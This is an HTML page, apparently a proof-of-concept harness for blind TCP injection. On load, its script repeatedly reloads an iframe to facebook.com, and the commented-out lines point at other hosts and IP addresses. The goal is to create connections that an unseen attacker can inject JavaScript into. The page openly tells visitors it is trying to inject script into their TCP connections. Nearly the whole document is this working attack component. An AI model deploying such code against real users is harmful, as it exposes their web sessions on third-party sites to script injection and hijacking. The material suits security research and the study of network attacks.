<html>
<head>
<script type="text/javascript">


    var sctimeout_id = 0;

    function scriptConnectTimeout() {
        console.log('Won the race');
        setTimeout(doagain, 30000);
    }

    function getTime()
    {
        var d = new Date();
        return d.getTime() / 1000.0;
    }


    function doagain() {
        console.log('doin again');
        f = document.getElementById('foo');
        f.parentNode.removeChild(f);

        f = document.createElement('iframe');
        f.id = 'foo'; 
        f.addEventListener("load", doagain, false);
        f.addEventListener('error', doagain, false);
        f.src = 'http://facebook.com/?' + Math.random();
        //f.src = 'http://' + unique + '-' + count + '.hobocomp.com/?' + Math.random();
        
        //f.src = 'http://69.171.229.11/';
        //f.src = 'http://141.212.109.239:8080/';
        //f.src = 'http://69.171.229.11/';
        //f.src = 'http://osu.edu/2008/images/home/sprite2.png?' + Math.random();
        //f.src = 'http://osu.edu/2008/css/osu.css?' + Math.random();
        document.getElementById('container').appendChild(f);

        //sctimeout_id = setTimeout(scriptConnectTimeout, 15000);
    }

    function meh()
    {
        if (sctimeout_id != 0)
            clearTimeout(sctimeout_id);

        console.log('Loaded');

        if (count++ < 600) {
            doagain(); // need to go fast fast fast! (gaps
                        // for receiving blind injections need to be
                        // in places where they would be useful (e.g.
                        // parsed as a response))
            //sctimeout_id = setTimeout(doagain, 10);
        }
        //setTimeout(doagain, 30000);
    }
    
    var unique;
    var count;
    function init() {
        unique = Math.round(Math.random()*100000);
        count = 0;

        setTimeout(doagain, 5000);
    }

    window.addEventListener("load", init, false);

</script>
</head>
<body>
<center>
<h1>Hi.</h1>

Please stand by while I try to inject some JavaScript into your TCP connections.
</center>

<div id="container">
<script id="foo"></script>
</div>
</body>
</html>
